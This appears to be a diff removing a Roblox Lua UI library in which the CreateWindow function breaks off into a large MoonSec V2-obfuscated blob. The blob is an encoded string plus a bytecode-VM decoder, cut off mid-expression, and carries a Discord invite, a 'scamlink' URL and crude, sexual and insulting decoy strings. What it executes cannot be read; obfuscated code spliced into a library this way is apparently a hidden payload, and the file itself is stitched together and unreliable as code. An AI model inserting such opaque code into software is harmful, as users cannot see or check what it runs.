-                game:GetService('Debris'):AddItem(container, 0)
-            end
-
-            return {
-                Refresh = reload;
-            }
-        end
-    end
-    
-    function library:Create(class, data)
-        local obj = Instance.new(class);
-        for i, v in next, data do
-            if i ~= 'Parent' then
-                
-                if typeof(v) == "Instance" then
-                    v.Parent = obj;
-                else
-                    obj[i] = v
-                end
-            end
-        end
-        
-        obj.Parent = data.Parent;
-        return obj
-    end
-    
-    function library:CreateWindow(name, options)
-_pFXXHWoOj1PHOWkT, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
-
-
-,nil,nil;(function() _msec=(function(_,__,_l)local _l___l=__[(-121+0xae)];local __l__l=_l[_[(679+-#{5,1;",";78;(function()return#{('lHLhhb'):find("\76")}>0 and 1 or 0 end),5})]][_[(727+-#{(function()return{','}end)();1,(function()return#{('hPOkLL'):find("\79")}>0 and 1 or 0 end)})]];local _l__l=(-#{'}','nil';1,",";(function()return#{('OLPbMM'):find("\80")}>0 and 1 or 0 end),(function()return{','}end)()}+10)/(-#[[starmcommunity.ru/scamlink]]+(0xac-((501-0x128)+-0x3d)))local _l_l=(((0x4488/(244+-0x28))+-#"Moonsec V2 deobfuscation in process")-0x31)-(-#{'nil',{};","}+4)local ___lll=_l[_[(366-0xcf)]][_[(0x2274/30)]];local _____=(-#[[im giving 50k to the one who solves this challenge]]+(147+(-0x33+((-124/(136-0x69))+-#[[Penis Sucking Utilities source leak lol!!]]))))+(-#"press this check button below the message"+(-0x78+163))local _l__=_l[_[((0x5613/39)+-#[[Luraph v14 ETA?]])]][_[(0x742-991)]]local __l=(294/0x93)-((-#"when is federal going to meet memcorrupt irl"+(0x106+(-0x38e0/(-#[[PSU Protected!]]+(0xf0+-96)))))/106)local __lll=(10+-#{157,{};26;1,1;157,157})local ___l=((36+((-30687+0x3bd0)/125))+0x5a)local _ll_=(-#"happy birdday wally"+(169-(0xfb+(-0xe+(-0x5d+3)))))local ___ll=(10+-#{(function()return#{('kfkbMO'):find("\107")}>0 and 1 or 0 end),166,1;1,1,{},(function()return#{('kfkbMO'):find("\107")}>0 and 1 or 0 end)})local __l_=(((-#'Hi I give skin away in game Counter of the Global Offense Strike. Send trade offer on sketchy link.'+(391-((-82+(-#{",",'nil';'}',{},1;",";184}+343))+-#'protected by Federal Scripting Utilities')))+-45)+-#[[Moonsec v6 coming out in 1 day]])local _l_ll=(0x5d-(13590/((805-0x1ac)-226)))local __ll_=((-0x54+(1728-(0x744-956)))/0xb9)local _ll__=(60+((-#"free moonsec anywhere you go!"+((0x1c8c/84)-85))+-0x1d))local _lll_=(((76128/(-#{'nil','nil',133,'}'}+187))-0x108)/0x26)local __l__=((((0x402c-(-#'MoonSec V3 cracked download not clickbait'+(0x4111-8339)))+-24)/189)+-#'You have deobuscated the code well done')local ___l_=(0x22+((-46+(-0x3adb-(-1399278/0xba)))/0xfd))local _l_l_=(-#{{};62;{};{};80,1}+10)local _llll=((391+-#{88;1;",",{};31;{};'nil'})/192)local __l_l=(((1019-(0x9f30/72))-0xef)/0x6b)local ____=(8+-#{'}',14;92;(function()return{','}end)(),(function()return{','}end)(),'nil'})local __ll=(304/(-#{55;55;55;1;55}+157))local _lll=(0x142/((609-(717-(-#"balls in ur jawz"+(0x1fd+-100))))+-#"Okay guys federal can notice you just stab a fork into your ass, write .gg/moonsec on your feet, and DONT send it to federal"))local _ll_l=(8+-#{(function()return#{('hlLkhM'):find("\76")}>0 and 1 or 0 end),'nil';{},'nil';49,49})local ___l_l=_[(0x4f18b/237)];local _l_l_l=_l[_[((-0x35+229)+-#'i hate noobmaster')]][_[(-#'a table b equals c'+(101907/0xc9))]];local __ll_l=_l[(function(_)return type(_):sub(1,1)..'\101\116'end)(',,.,###!')..'\109\101'..('\116\97'or'^$%:};.,').._[(0x4a1-635)]];local _ll_ll=_l[_[(-#[[loadstring()]]+(-0x20+594))]][_[((232317/0xf9)+-#"v3 has it")]];local __llll=(7+-#{'nil';(function()return#{('fPFBmh'):find("\70")}>0 and 1 or 0 end);",",'}',(function()return#{('fPFBmh'):find("\70")}>0 and 1 or 0 end)})-((((0x25e-357)-0xa8)+-#[[totally obfuscated with luraph]])-0x31)local _lllll=(((6360/(0x26ec/94))+-#[[HEY NO FAIR]])+-47)-(-0x71+115)local ____ll=_l[_[(4770/0x1e)]][_[((389+-0x20)+-#[[HEY NO FAIR]])]];local _ll=function(_l,_)return _l.._ end local _l_lll=(11+-#{(function()return{','}end)(),1;",";23,(function()return{','}end)(),(function()return#{('HpfOHk'):find("\102")}>0 and 1 or 0 end);24})*(((-#[[moonsec v4 out now]]+((-0x15e1+2749)/46))+0x73)+-#'shut the fuck up no one loves u')local _lll_l=_l[_[(1187+-#{74;1;",",{}})]];local ___=(0x1bc/222)*(-55+(-#"what wally is using"+(-0x57+(-85+0x176))))local __l_ll=(1058+-0x22)*(0x198/(((11126400/0xbe)/240)+-#[[unexpected skid reading this near line 1]]))local _ll__l=((-#"gay person has currently attempted cracking of the century"+((-#[[ok. how about constants that dump themselves]]+(8412/0xc))-0x186))-157)local _l___=((((-#'Spoiler: You will fail.'+(124+-0x78))+-64)+-#[[boy what the hell boy]])+106)*((118-0x60)+-#"Slowmode is enabled.")local ____l=_l[_[(-0x7b+1147)]]or _l[_[(((0x1f5858/206)/18)+-#'c0ck')]][_[(-0x7b+1147)]];local _l_=(-#'balls in ur jawz'+((8519040/(0xba+(-0xa40/64)))/216))local _=_l[_[(-#{(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end);(function()return{','}end)(),{};'}',(function()return{','}end)();(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end),(function()return#{('kLLhff'):find("\76")}>0 and 1 or 0 end)}+1265)]];local _l__ll=(function(_l_)local ___,__=1,0x10 local _l={j={},v={}}local _ll=-__l local _=__+_l_l while true do _l[_l_:sub(_,(function()_=___+_ return _-_l_l end)())]=(function()_ll=_ll+__l return _ll end)()if _ll==(_l_lll-__l)then _ll=""__=__llll break end end local _ll=#_l_ while _<_ll+_l_l do _l.v[__]=_l_:sub(_,(function()_=___+_ return _-_l_l end)())__=__+__l if __%_l__l==__llll then __=_lllll _ll_ll(_l.j,(____ll((_l[_l.v[_lllll]]*_l_lll)+_l[_l.v[__l]])))end end return _l__(_l.j)end)("..:::MoonSec::..!*%&/+^,;.:_#$}=+#^:/!*^}/#%.;^}//*:=!*,$#.$/;*}=/#::!,^;!^%%*$::/,:+!;},!/^*;$$#^;=,*/_**=+##;!!:$:_!;^#=.:^./%%&!*^!&_!#}%_;$^$&:;,++=}+.,^;&}*/&,%=!/$*__/*=+#/.:,!_%;++/&:==}^#&,%!/##:%,;./;$^;&/}#}+#/._,%*,*%}.#%.!#==!:};/+::!^,/=%^}$#!.$,;!}*.=_#=^,;!/+&*_=$_;,/+*=!/=}:=}/%*}##%.;:=:;;,+.&/}}$,_+;$^;%=*_,_/#%%=;/&$*,=%__}%+$.:;,}+/,%^+&,*!},#::*%$=!_!;^+#,/^./**==*$%:+;*+!*#}%$^._,}+.%#=&$::&;%/$&._=,%/%*;}}+!+;^_.&.,_$#:.},//:%!=^##=/_;/,%/%&$,:^,#+%;#,!&+**},__.}+/}&:};/+:,&^=+!*_!%#&:%,$/;*==#+;/!!}}/_:=%#=_!/!/:&^!&$#.%*$}##%.;}!:.;_^+%_!=}^#&%/=/#::!+!^%}+.^:+!$*}+,%^=#$%}_},#;.&,:&_*:/=+=%}!/$:=&=+#}.,/=+&*$+,^/&^!#}%=:=$#;_&^%}._#.%^;:#,.^*&_.$^#/%*;&}&!=_}.:_;}^+#:.},//:%!=^##}$_;:!%$=:$!:^$&#*.:^./,*:}*_..*:^$}:};/+:&:}**}=}.+:#$;*/}!_^;#:..$;%&,*=!%$#:+,+/$_}.#^:/!*^%}&*=#},;_.&^%&+/!,_/;*}=/!#_&%$:}*^..*.;_*&=/%:=#$%:;=%_$.,^+%;_*;%+;%}/,/%*+=.$!;^!;$}_/;:^!,^^*%%+#.%^/&:*!+&$;,^!!_.*;}:#!.^__/;$:^.*^:+,!/^*#&}&,!*$+_^,!^%%$*_$$#!,^!^$!:^,##+;$,%/*!==/_,:!^&&:*:}.%,&^!^$#_%#.#_:&,=/}%:+.^^&;!}}/%;=*$&:*_^}}_}./^:,/#_#$,%^*=_.^%&=!#^.#}._,.!+=&$*!$,:=;,#,#}:/,:+!%^=#!;};=.^&%:!!$^#_:#^}%&$_+}&^}=_,^&%,#..&&_=*%}!#}%_;;}^/_:+*%^_#.:^;&}*/%$%*!%$;:/,.+*%=}},!/^*#=%#;*}#,;:*^==##:%,;#+;+^^&_*.}#_,;$^%=$_&;!+^%#^.&.*_}.#$.+,//=*,%}+}&/!:}!_^##_/,;!}}:_:.!^^^#*!+&=_:*;^__*.}##%.;}*_$;;}^##.#,%/;^_+.&}!;}+_!/_=##}:/,:_,;,^.&,$*;,+/%:!!&.*_=!##;=^$/;*+=;:}&:!;$}_/$%$/::,#&%%,!*$;_+*+}^_#.%_::,,_+%&/;}^#/%*;}}#/+:#^;^#!=^#;.},/_$;%&.}}#_,}/}%/=:_!:^$$_;}^/.#:_&;!+^%#//&,=$#:,}/$*.$,:_+,+}&/!:}!_^;#+%,,!}},_:.!^^::,,+=&.:%^:/!*^+&%&!+$&_,,=+}&.!*:*_!.%^;&:^=,^/#%%=;#}:/_..!#:!+$%:;,}:,;$,%&_**=!.=:&^$:,_#;^+#&%+*/#%:=.#_._+=/,%:!/#.:#!^}:_#.%^;:+,++,%+**,!/%*;}}&+_/&^#&.,=}#;.},/.*;_/+/+**}}_+.$+}*^!=#;/:%;=}$/::;!+^^:#%$;_/;/+:&!_!$=/%^:!__.!:};_^;#^%:#,$+%%==$#;:*;/^&#*./^:/!+_&=*%;},$//*:=!!,!!$^;$./+.&;*/_}:$.!+#&:!.}#:%%_=#$%:;$&.;.&^$!;:#;;+;%}!/+**.=/#!:*,=!,_,;:^!&^/$&%!*}!^.&:*!}^**$^$*:_/^^+#..^^#/%^;+:%+*&$+_;^&^,&*^_;*/:%!=^%$*%}*,$._+=&%!}}_#*.&,*!&=#;,+^%#!%%}*&},#}.=,;!=!/;}+}&/!:%$%+=:#$.$;,}/#&.!^^&#^./.%:==$$_!,_+*%^.;,%//*:=!%$=$$=:$/,=_#::!,^_!;_^_&**&}#_/=&!/$%:;,}._,%++&_*:$/#^.^%$}+_!;^+#.+*+:%**.=*+._*}.%*,.+;$/!*!}^_#}%$/.=;$/=&%_=,*/%*;}}!,!^$=_$;:=%##.},//:^:^.&_*!#:+&%/=:$!}#}_#/;_^&,;_:;!+^%#^%=%,&=!^}}.^;=#,%=.,.__,,!*,}=}!^&}!}}/_:=+:$+}*:#,;_;#^:/!*^}##%*;_,;/*!=,#^.#,%:}.!^&&,=%_$;},/=$#}:/,:#/.=^#&,*_:,+:%:!!$^*_}/#%.&^,/}+/.,+#&%!;&!*.=:##.=^=/&%#=&#;;$;/++%}=&#=:&^;}:#!.^^#/%.;&^!/}#,,/^*#=%%,=$$$_;;/+_//*$,=/}%/=:*&*+}}_,^=,&&$%+;,+^%#!%/,*}=;#&.=,//=,=.;+}&/!:/*=^&_%%:^^#!*.!%;$#;!##,,*__++&}/*#}##%.;=^,*.$%/:.},,%/}*}=/#:}&};_*;&^#&&=^;^+!%^=#%^*:},__.*^+/;=*=;_$.#,;++_,;^+#&%,!+%%;=:.:^+&_&/_;;}^/&:$=}^_#.%^;+://*,!*};,^/%*;}}!}!$$=_/^!+,%_!$$;:=/_=^##:%,;/}^/+!*!%*;++%%;=}*^*.}/#=,%,*/:**}.;&&,!^$#_%$!$%:;,:%,*_!!_/;;!}}/_:$!+:$$/=:&/##%&_#%*/_$&$:#%#::%^,=!.,.%=#%/+_=}::#&#:^%*_!%#.}%*.$##.*!,.^#!,===,#!%&*!!,!=;,/=/,&}*+$.,*&$#+%$}+:;//.#$/__$=+__/&_=}._/&%_/$$._$,:!*^;=*^/;}!/_*//:*#=%#;}^$.:_;/,*$&:%,;/};^&%$*,,!;_*+,=/}.::;!+^.!^_/_**=&##./&//&*._,#+;+/=%;};!*_#_!^&/=&+.:^^&#*%&&%,=,$+.!;%/$&_=$}!}:*:=!#^.#,%/;/%&/.,:;,^/#%%/_&**^$=_}^$,*&_/#;/+/%:!!%;**}=#,:%^.,}_;;^+#&%+!+%%;=:_!:+,=+^!:.%^/&:*!&/*$==#$_.*:}:#!.^#/.;,+#/:!&;*/+!*#=%#;=$$&_$;++./**/$$_&.+/#$.:^,#+%,++=&_*;}.#::*^^&$%.;.+:&!!^%=*+=,$!..;+}^_^;#^%&}!/**$.*,=#&#*;};_}./_::*;;+*&!!#^//:*:=!#^$$$+_#;,^:%=^$;!/#%%=;*/!$}#_+,.^*//*}}&#^:+!^$^:#;%_#^.!&:_/=!&+#&,!;$}_/=:$%.=,:+^}*./^/&:*!%.;.#%_:}+#}&##^.^^#/%&,+;&%_}:.^!}.=^#;.},/.%;++,&!*$;./}%/=:%=*^#%::;!/^%_*.#=#!+$+%%!=$$_#+;/+;}+_%;;+},,,%/*%;}$#+:#,&+^_!:/^^&#*%&_%&!;_:_%,=+.%&!:},./,_^%&:$=_;_:,=^*%=^$,:/#%%=;/*!.}^_^/===$%:;,}_+.:^.:&_,;%+;%}+!/.*&},#;;%,/&=%$}=$%;;*,}%_;;}:#:};/+^!==,$:_/,$/$%+^&,,/%*;}}&!==$*::;*^/&_*%$+_}.&#&$/:%,;/}^$^;/&*:$$#!;_^&#:_!;!+^%#=_:$=.:%/;=,;*}#_%;;+}.%!=+,$/^;*%.+!,^,=$,^=$&._^^;}+_$,^/!*^}#!&=#$%;..%^/&;=$_+:..*+#=&:;,^/#%%/!/&**$__}.+^+&^=:;/+/%:!!}*^;,!#%.;/_%##!;^+#&%+!+&%*}_#}:+,+/^!:=$$&:}^!/,%}!^!#/;*/}:#!==$=:},_+:&&!$}+_;;*=%##.},//:^&+,&=!:=&+%%/=:$!*^$$#/.#:%$}::;!+^,&^,/#!*}.##:^^=&=*,++^#&/!:}!!/=*$.:#,$+%%$==##_!+#&_!$}%.&/:*^}##%}%#*.&^;&+&/==}*:#;&/^$!:!,^/#=_,$_!}.!^$!%^!%$%:;,}_#,/%+$+;$&,=#&^!/$:_!}:#*.;^.+&%!=}$&%#!=}%_;;}:_.=;/$#$%.%^;&},%==;!%._/&.$!+#}!%;$^;+%&:+&=_,+,$+^*:_,^!&#:+%%/=:$!=%}*_;.##_$=::;!+^;=^:&$**}=_$.*,%/;*,=:!%&$!:}!_^#}$*.#;,%:%.!%#.:*_^}}_}./^:#%!.!^+*:*+!_=%+=!#^.#_}:$,=+;%=*%$;__;&^:&%.:;&+!%^=#&+*!$=#^;_^&/:**=/+:%}!/$:_!;^+#^!/;:__#;:^!&^/}+**#!,:__&;%++_%.#^;&}*/&$&+!;$%:&,_+&!_!=$.#*%%=%#;.}:;^.^%;/}&#$*}/}%/=:$!:^,#,%^;#_$$::;!+^:&^,&:*^=&#.._/=%!+^.!+}&/!:&&*_!!_+._,$+^*=+$^#&#*%};./:!*,!:+!+^}_:,^}//*:+/&.!%.%_*.**/&%!*};_.;}+$/**,=++%%^=#$%*,=*=;&!!!$^:#}}+_*+&!$;%&+&^;&%!;$}*^}}_.;_/;*$}=,/;,+;*_$#;_.%^;&}*/}:;!}_:#^_*}}}#/.::/%!!%&_##,^.$/}%!=^##=%$.#!.;:!$!:^,#+%%;,}*/}:%/+_%#!%$;=/=^__.$^_$}_%;;+}&/!:}!_^;#$$&}!}}/_:**_;.==!}%%%!=,%/!*^}#*%!,}*:$;}+.&+!:}$/#*}=/#:=&$=#^;,,&$/:/,:+!.}^#&+!.}:#!#}!&$^:#;%:/.&^_$:_+;^+#&%^://!=}!_*;;!=}%_;;}_.:#,#!=#*.%^;&};,/;*=}&:;!=*}}}#/.:#^_=&#%_$=&$#;/:%!=^##:%,;.:^/,+$/:^,#+%,!^&&+!}%/#}%#!%$;*+}&:+^&%;_*^;%:%*};_/^^&/=.:$&.&!=}_}/%&^!,#%/:+/!/#&;_+/*^$/.}*#},::^/%.};:},*&%=&_*,#&.=._#,}/&!&#*;%^/&#}&:,.^/*=+#+,}+%}::%:,&=*+$$;!&:=$_*^}^+!,_:,}/=&,_#.+/%%*};:+^&%&}+_*,/%&}_.$.=*#!+:&^/^+!!$/:$%^}$_+;//+&.}/_,;&*&#/_.+_/*};;;,!%!=;$/::;!+;/:!%$;:};/+:&!!^}}_^;;+}&/;.}!_^;#^%&;!}}/_:.!^^&#*%};_}./^_/!*^}##%.;;!//*:=*#^}&,%/;*}!^#::!,,/#:$=;#}:/:!+!%^=$$%_*,}++%:,,$^_!$;+;%}!/}&_!;,+#&%**$}_/;:^*&^!#}%_::#^/&_*!},_#.%^;+!^=}:#*.^#//%*;}}#/.:,!/,*#=%#;:!,/+#%!=^#}:%$!/}%/=:}%:^,#++%;,/$/::;!^;%#!%$#:}:*+:&!!^}}_%;;^&&/%+}!_^;#^%&;!}}^_:.+^^&}*%!;_}./^_/!*;}#&!.;;!//*:=%#^=/,%/;*}!^#::!,./#:;=;#}:/;#+!%^!!$%^!,}+/%:*%$^:#;,+;.&!/$:_!;^+#&%!:$}_.;:^%&^!#}%_;.*^/&_*!}^_#.%^;&}*;}:#!.^,*/%%:}}#/.=,!.}*#=%#;_!,//:%^=^.!:%,;/}&^=:$!:$,#}:%;=}$/_#;!+^&/!%+*:};/+:&!!^$#_,;;^^&/!#}!#;;#^%&}!}&#_:.!^^/}*%};#+./==/!*^}#$/.;^}/#*:;/#^.#,%+:*}=/$&:!},/#%%=;#}:/,:+^%^!+$%::,}+/%:!!$::#;,+;&/!/}#_!;^^*&%^!$}_/;:,%&^!#};_;},^/&:*!=;_#.%^=&}+*}:#!.^,}/%*;=^#/+*,!/^*#=%#;.},./:%;=^#}:%;:/}%/!!$!=},#+%%;*!$/::;,+^.+!%$;:}.^+:&!!}$#,,;;+}&/*#}!_^.+^%=}!}}/_:.!^^&#*;};#,./^#/!*^}##%.#^}/.*:=^#^:},%/;%&=/%%:!,^/#&/=;#}::,:;#%^=#$%_:,}+/&*!!!!:#;%+;/!!/$:_;;^;;&%!;$}_/;:^!&_!#}:_;.!^//#*!}^#%.%#!&}*/}:$%.^^#/.*;&/#/.:,!+;*#=%$!.}=%/:%!=^$}:%,;+,%/%:$!:^,#+%%;=}$:::;.+^%}!%$;:};/+}&!!_$#_;;;,!&/!:}+_^}/^%&;!}=^_:.!^#&#$/};_}./,#/!*^=&#%*:^}//*:!%#^.#,:/;#$=/#::!,^/#%%=$#}:#,:+%%^!}$%:;;/+/,/!!$^:#./+;%}!_$:*=;^+#&%!;$}_/.!^!&;!#}/_;;}^/&:*/}^#*.%^}&}%^}:#!._^#.:*;}}#/:#,!/^%%=%%,.},//:&%=^##:.,;}}%/=:$!_;,#+%&!=};}::;!+^%#!%$;_&;/^%&!!;$#_%;;+}&:!:}*_^;#^%&;!}}/#*.!^^&#*+};$!./^:/;*^//#%.;^}+^*:=!#=.#.^/;*}=/$#:!,^+^%%;!#}:/,:^%%^=#$$:;,=+/%:!!$^:#;%^!%}!=$:_%;^^}&%!;},_/}%^!&^!#=/_;;}^}&:_/}^_#.%,:&}*/=+#!*=^#/%*;!!#/.:,#/^/==%#;.},//:%!==##:},;+!%/=:$!:^;&+%&!=}$$::.%+^%#!:$;!^;/+:&!*;$#_%.*+}&=!:}!_^.}^%&;*;}/!&.!^^&#%/};_}.=^::!*^}##%.;^}//%%=!$*.#,//;&!==#::.,^;&%%=;#}#/,:+!%==#$_:;.;+//:!!$^_+;%^*%}./$:$!;^+#&_!;},_/!,^!/;!#}%#%;}_#&:*!}^#}.%^;/.*/*,#!.^^#+/*;}}$!.:*;/^*#=%$:.},/+,%!&;##:%,;/}%/=:$::^;.+%%:=}$/::;!+=%#!_$;_;;/+:&:!^}&_%.!+}&$!:=%=};#^:&;^^}/_:.!,;&#*%=*_}&+^:/!*^=}#%.;,;///}=!#^.#;//;*}==#:#},^/#%%=;#}:/;%+!&*=#$/:;.}+/%:!,$^_/;%^;%}!/$:_!;#+#&.!;$=_/;:^:&^*!}%_$;}^:&:*!&,_#.+^;/%*/}_#!.^,^/%*.}}#^.:,&/^%}%##;:!,/;*%!=^###%,;/}%^=:$%:^*.+%&:=}$/:};!},%#!%$;:};/+:&%!^}!_%;:+}+/!:}!_;;#^/&;:$}/_:.!^^/!*%}._}./^:/!*^}##/.;,%//*#=!#^.#,%/_*}=/#::*,^+}%%=;$%:/$%+!%^=#}/:;,}+.%:_^$^:#;%^:+%!/}!_!=!+#&%!;=!=*;:^,&^;+}%_;;}^/&:*!}:_#..^;/!*/=##!.^,*/%,!}}#/.:;%/^*#=;#;=#,//:%!!;##:%,=/}&%=:$!:^;}+%%;!^$/#$;!+^%#!%$;:};.+:&;!^$}_%;;+}&/!$}!_:;#^,&;%!}/_:./^^&=*%};_}.:^:/!*:}#/;.;^=//*:=!#:=%,%/;*},:#::*,^+!,;=;#}:/!.+!%,=#}/$.,}+;%:*/$^:#;%+}/$!/$}_!*!+#&&!;$}_/;}_^&^!#}%/%;}^+&:*/&#_#.%^;#$*/}_#!:;.$/%*#}}=$.:,!/^%%!%#;:%,/$.%!=,##:&,;+%,:=:$!:^!_+%%.=}}^$_;!+:%#&,$;:};/,:&&!^}!_%;#+}/;!:=%}};#^^&;%%}/_:.!^^,}*%}#_}./^://*^=}#%.;,&//,%=!#^.#;//;*}=:#:^;,^/#%%!:#}:/;*+!}&=#$%:;.!+/%:!;$^:};%+;%}!/$:_!;_+#&:!;}!_/.:^!&^*!}%,_;}^.&:%!}^_#.^^;+^*/}##!:;^#/%*$}}*#.:,!/^%}=%#;:/,/^=%!=^##_/.#/}%_=:}+:^,#+%&:!=$/_%;!^+%#!%$;:};/+:&+!^}/_%;:+}//!:}!_:;#.;&;*&}/#:.!^^/!*%=/_}.,^:+%*^}##,.;;%//*:=!#^.#,%/}*}=;#::!,^/#%%=;$&:/,#+!%,=#}/:;,}+.%:;,$^:#;%^:%}!/}!_!$}+#&%!;=!_/;:^,&^;!}%_;;},^+}*!}}_#/,^;&}*/=#=^.^,+/%;.}}#/.:,!/^*#=;#;:,,//#%!=^##:%,$/}%^=:$*:^;}+%%;!&$/_*;!+^%#%%$;:};.+:&+!^*/_%;}+}&/!=}!./;#^&&;!=}/_}}^^^&#*%#^_}.+^:+%/,}##,.;,+//*:=!$;}^,%/}*};%#::!,^^#%%=;$/:/;!+!.*=#}/:;,}+#%:/&$^:#;%+;%}!/}&_!;,+#&&!;=!_/;:^:&^.:}%_;;};/&:*!=!_#.#^;:.*/=##!.^,;/%$&}}#/.:,!/^*#==#;.},//=%!!;##:%;^/},#=:$!:^;}+%%;!$$/};;!+^%#*/=#:}./+:}%!^$#_%.:.!&/*_}!^*;#^%&;!}}/_:.}^^/$*%}:_}:/^:/!%&}#&=.;,#//%#=!#^::,%.;*}=/#:#!,^/#&!=;$#:/.&+!&;=#$%_,,}.&%:!!$^_};%+;&}!/%%_!;^+#//!;$}#+;:.=&^!#}%#:;}^//#*!:%_#.%^;&}*/}:#}.^,}/%*:}}$/:!,!+&*#_*#;:#,/+#,.=^$::%#;/}%/=:=!:^,#^!%;!#$/#&;!^;%#!%},:}/!+:&!!^}}_%;;^}&/!#}!_^;#,/&;!}=+_:/#^^&#*%=:_}./,#/!*;}##%.;^}//*:=}#^:},%/:*}!/#::!;&/#}!=;$#:/::+!%^!.$%_+,}.&%:&!$^:#;=+;_%!/}:_!;^^.&%*%$}#*;:^%&^*}&/_;..^/,**!}^_#_%^;&}*=}:#_.^!./%%:}}#/:,,!+$*#=%#;.},//:%_=^$.:%,:/}&/=:$!:=,#$+%;!.$/::;!+^&+!%}%:};++:&!*&$#_;;;^,&/!#}!$^:=^%&}!}}:_:.;^^/}*%};#^./#%/!*^}#$/.;^}/$*:*!#^.#,%+:*}=/$/:!%//#%%=;}!:/,:+_%^&,$%:;,}+/%:!!$}:#;$+;&!!/$:_!;^^%&%*!$}_^;:,!&^!#},_;#^^//!*!=;}$.%^$&}*_}:#!.^;#/+*;=&#/.=,!:}*#=;$;.},./:!}=^#$:%,./}%;+!$!:^,#/!%;==$/_#_*+^&*!%$=:};/+:/%&,$#_;;;;+&/!:}!#;_$^%&=!}/#_:.!^^/%&*};#+./+%/!*,}##%.;,%.:*:=!#^;/,%/.*}=;%!:!,^/#!_=;#=:/,:,:%^!&$%:;,}+/%:!!!!:#;:+;%}!/$__!.;;$&%**$}+^;:^!&^*#};_;.^^/:!*!}=_#.%,+&}*:}:#;.^^}/%%;=/#/.=,!:}*#=;#;_!:+/:%+=^%}:%,;/}///,$!:_,#+,%;/#$/_#;!+^&%!%!*:};/+:/%!^$#_.;;^+&/!:}!$^;#^%&=!}}__:=;^^&#*%};#&./,*/!*;}#$/.;^}/:*:!*#^.#,%^;*}=/$!:!,#/#&_=;}}:/,:+,%^!*$%!_,}+/%:!!$#:#;/+;%=!/$:_!;^^*&%!:$}_/;:^!&=!#}%_;;=^/&:*!};_#.%^;/!*/}:#!.^,*/%*;}}&/=$$*_%;;*$#;.},//:%!=^##:%.+/}%/=:}%#:,#+/%;!!$/::;!^;+!!%$_:};^+:&!!^}}}&;;^%&/!_}!_^;#^;+}!}}._:.!^^&$*%}#_}./;*/!*^}##/.;^}//*:!,#^.#,%/;*}=/#::!;$/#%%=;$*:/,:+!%^*&$%:;,}++%:!!$^:#$.+;&%!/$#_!;,+#&;+,$}_/;:,.&^!$}%_.;}^;.!*!}^_#:_^;&=*/=!!=.^^#/%&*}}#+.:,*/^%!/;#;.},/^&%!=,##:;#,/}%+=:}.:^,$+%%;=}$;!!;!+^%#*_$;:=;/+:&=!^}!_%;:+}&,!:}!#+;#^,&;**}/_#.!^#.!*%}#_}:;^:/**^=*#%.##///*:=!$:.#,&/;%%/:#::!,^^+%%=.#}:/;.+!%:=#$/:;;*+/%:!=$^_*;%+_%}!^$:_^$++#&^!;=,_/;_^!&_!#}^!};}^/&:%.}^_$.%^#./*/}:#!_!^#/&*;}}*..:,//^*#=%#;.},/^+%!=:##:&,;/}%/=:%::^;!+%%:=}$/::;!+=%#!%$;:=;/+:&!!,$#_%;;+}&/!:}!_$;#^%&;!}*=_:.!^^&$*%};_}./^:/!*^}##%.;^}//*:=!#^.#,%/;*}=/#::!,^/#%%=;$*:/,:+!%^=#$%:;,}+/%:!!$^:#;%+;%}!/$#_!;^+#&%!;$}_/;:^*&^!#}%_;;}^/&:*!};#/.%^;&}^;}:#!.^^#/%*;+}!/*+,!/^*#=%#;:%,//:%!+;/+*^$$#.%:=:$!:^}=#^.:^,/%**$%+:%#!%$;**}#__:%$+$#_%;;+}&/!:$!=+;#^}&;!}}/!*=__+_+;*+}%+!$#};^,=&;}_._^}//*:^&&_=}.//;*}=/$#$*,^/=%%==#}:/,:+!,.=#$+:;;*+/%_!!$#_#;%+_%}!.$:_*;^+$&%!#&/_/;:^!&_!#}&_;.%_:&:*!}^#/.%^.&}%^*_#!..^#/.*;}}#/.:#&/^*==%#_.},+/:%!+!##:+,;+!%/=:$!_;:!+%%_=}$:::;!+^&}%$$;_%;/+#&!!^$##/;;+}&.!:}^_^;#^%&;!}}/#!.!^^&#*%};$!./^:/,*^=%#%.;^}/;*:=!#_.#.!/;*==/#::%,^++%%=##}:/,:^%&;=#$#:;;%+/%:!!=^:#;%^%%}!}$:_+;^,#&%!;}._/;:^!&}!#}%_;;},*&:*;}^_#.%^;&}*/=;#!.}^#/%*;}}#/.:,_/^%:=%#:.}.//:%!!*##:$,;+*%/=:$!:^;,+%%:=}$^::;!+^%#!$$;_.;/+$&!%^$#_%.&+}&=!:}*_^;#^%&;*;}/_#.!^;&#*%};_}.;^:/.*^=^#%.;^}//%&=!#..#,//;&}=/#::&,^++%%=.#}:;#^+!%_=#}!:;,=+/&#&*$^_*;%+=%}!/$:_!.!+#&,!;$=_/;}^!&^^^}%_#;}^^&:*!}^_#._^;&}*/}_#!.^^#/%*;}}#/.$,!");local _l__=(-#'am gay'+(0x2010/171))local _l=108 local __=__l;local _={}_={[(0x23/35)]=function()local _,_ll,_lll,__l=___lll(_l__ll,__,__+_____);__=__+_l___;_l=(_l+(_l__*_l___))%_l_;return(((__l+_l-(_l__)+___*(_l___*_l__l))%___)*((_l__l*__l_ll)^_l__l))+(((_lll+_l-(_l__*_l__l)+___*(_l__l^_____))%_l_)*(___*_l_))+(((_ll+_l-(_l__*_____)+__l_ll)%_l_)*___)+((_+_l-(_l__*_l___)+__l_ll)%_l_);end,[(-#'psu is powered by garlic paste'+(-80+0x70))]=function(_,_,_)local _=___lll(_l__ll,__,__);__=__+_l_l;_l=(_l+(_l__))%_l_;return((_+_l-(_l__)+__l_ll)%___);end,[(333/0x6f)]=function()local _ll,_=___lll(_l__ll,__,__+_l__l);_l=(_l+(_l__*_l__l))%_l_;__=__+_l__l;return(((_+_l-(_l__)+___*(_l__l*_l___))%___)*_l_)+((_ll+_l-(_l__*_l__l)+_l_*(_l__l^_____))%___);end,[(41-0x25)]=function(_l,_,__)if __ then local _=(_l/_l__l^(_-__l))%_l__l^((__-_l_l)-(_-__l)+_l_l);return _-_%__l;else local _=_l__l^(_-_l_l);return(_l%(_+_)>=_)and __l or _lllll;end;end,[(95+-0x5a)]=function()local _l=_[(-66+(5561/0x53))]();local __=_[(0x61+-96)]();local _lll=__l;local _ll=(_[(0x4c-72)](__,_l_l,_l_lll+_l___)*(_l__l^(_l_lll*_l__l)))+_l;local _l=_[(0x70-(16308/0x97))](__,21,31);local _=((-__l)^_[(-#[[Wocky Slush]]+(-0x1c+43))](__,32));if(_l==_lllll)then if(_ll==__llll)then return _*_lllll;else 